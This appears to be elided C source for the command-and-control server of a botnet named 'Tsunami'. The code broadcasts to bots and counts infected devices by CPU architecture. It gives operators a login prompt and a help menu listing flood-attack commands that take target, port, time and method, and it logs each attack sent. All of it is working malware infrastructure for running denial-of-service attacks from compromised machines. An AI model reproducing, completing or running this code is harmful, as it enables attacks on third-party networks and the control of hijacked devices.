...
void broadcast(char *msg, int us, char *sender)
{
        ...
        for(i = 0; i < MAXFDS; i++)
        {
                ...
                {
                        send(i, "\x1b[1;36m", 7, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[1;36madmin\x1b[1;36m@\x1b[1;36mTsunami\x1b[1;36m# \x1b[0m", 46, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
                        ...
                        else
                        {
                                ...
                                while (1)
                                {
                                        ...
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
												...
												if(strstr(buf, "[Tsunami] Connected [ ARCH:x86") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "[Tsunami] Connected [ ARCH:MIPS ]") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "[Tsunami] Connected [ ARCH:MPSL ]") == buf)
												{
													client->mpsl = 1; 
												}
												if(strstr(buf, "[Tsunami] Connected [ ARCH:ARM") == buf)
												{
													client->arm = 1; 
												}
												if(strstr(buf, "[Tsunami] Connected [ ARCH:PPC ]") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "[Tsunami] Connected [ ARCH:SPC ]") == buf)
												{
													client->spc = 1;
												}
												if(strstr(buf, "[Tsunami] Connected [ ARCH:ARC ]") == buf)
												{
													client->arc = 1;
												}
												if(strstr(buf, "[Tsunami] Connected [ ARCH:IDK ]") == buf)
												{
													client->unk = 1; 
												}
...
{ 
        ...
        sprintf(botnet, "\x1b[1;36mUsername\x1b[1;37m:\x1b[37m ");
        ...
        sprintf(botnet, "\x1b[1;36mPassword\x1b[1;37m:\x1b[37m ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        ...
        char line1[80];
        sprintf(line1, ""CYAN"%s"WHITE"@"CYAN"Tsunami"WHITE"# "C_RESET, accounts[find_line].user);
		...
		void *titleWriter(void *sock) 
		{
				...
				while(1)
				{
						...
						sprintf(string, "%c]0;%d Devices Connected | %s%c", '\033', clientsConnected(), accounts[find_line].user, '\007');
        ...
        if(strstr(buf, "bots")) 
        {
            ...
            sprintf(arm,  "\x1b[1;36mTsunami.arm \x1b[1;36m[\x1b[1;37m%d\x1b[1;36m]\x1b[0m\r\n", armConnected());
            sprintf(mips,  "\x1b[1;36mTsunami.mips \x1b[1;36m[\x1b[1;37m%d\x1b[1;36m]\x1b[0m\r\n", mipsConnected());
            sprintf(mpsl,  "\x1b[1;36mTsunami.mpsl \x1b[1;36m[\x1b[1;37m%d\x1b[1;36m]\x1b[0m\r\n", mpslConnected());
            sprintf(x86, "\x1b[1;36mTsunami.x86 \x1b[1;36m[\x1b[1;37m%d\x1b[1;36m]\x1b[0m\r\n", x86Connected());
            sprintf(spc,  "\x1b[1;36mTsunami.spc \x1b[1;36m[\x1b[1;37m%d\x1b[1;36m]\x1b[0m\r\n", spcConnected());
            sprintf(ppc,  "\x1b[1;36mTsunami.ppc \x1b[1;36m[\x1b[1;37m%d\x1b[1;36m]\x1b[0m\r\n", ppcConnected());
            sprintf(arc,  "\x1b[1;36mTsunami.arc \x1b[1;36m[\x1b[1;37m%d\x1b[1;36m]\x1b[0m\r\n", arcConnected());
            sprintf(unk, "\x1b[1;36mTsunami.unknown \x1b[1;36m[\x1b[1;37m%d\x1b[1;36m]\x1b[0m\r\n", unkConnected());
            sprintf(total, "\x1b[1;36mTsunami.total \x1b[1;36m[\x1b[1;37m%d\x1b[1;36m]\x1b[0m\r\n", clientsConnected());
		...
		if(strstr(buf, "help")) 
        {			
			sprintf(botnet, "\x1b[0mattack - Shows a List of Attack COmmands\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "servercmds - Shows a List of Serverside Commands\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "admincmds - Shows a List of Admin Commands\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        ...
        {			
			sprintf(botnet, ". S [TARGET] [PORT] [TIME] [SIZE]\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, ". H [URL] [PORT] [TIME] [THREADS] [METHOD]\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
		...
		if (strncmp(buf, ". S", 3) == 0 || strncmp(buf, ". U", 3) == 0 || strncmp(buf, ". T", 3) == 0 || strncmp(buf, ". H", 3) == 0)
        {
			...
			fprintf(logFile, "[Tsunami] [%s] [Sent an Attack!]\n", accounts[find_line].user);
			fclose(logFile);
			printf("[Tsunami] [%s] [Sent an Attack!]\n", accounts[find_line].user);
        }
        ...
        {  
			...
			FILE *logFile;
			logFile = fopen("actions.log", "a");
			fprintf(logFile, "[Tsunami] [%s] [Killed All Pid's]\n", accounts[find_line].user);
			fclose(logFile);
			printf("[Tsunami] [%s] [Killed All Pid's]\n", accounts[find_line].user);
        }
...
{    
        ...
        {       printf("[Tsunami] [Admin Connected] ");
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("connection.log", "a");
                fprintf(logFile, "[Tsunami] [Admin Connected] [%d.%d.%d.%d]", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                fclose(logFile);
...
int main (int argc, char *argv[], void *sock)
{
		...
		if (argc != 4)
        {
			fprintf (stderr, "[Tsunami] Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		...
		if (threads > 850)
        {
			printf("[Tsunami] Lower Threading Count.\n");
            return 0;
        }

        printf("[Tsunami] Socket Opened On Port %d\n", port);
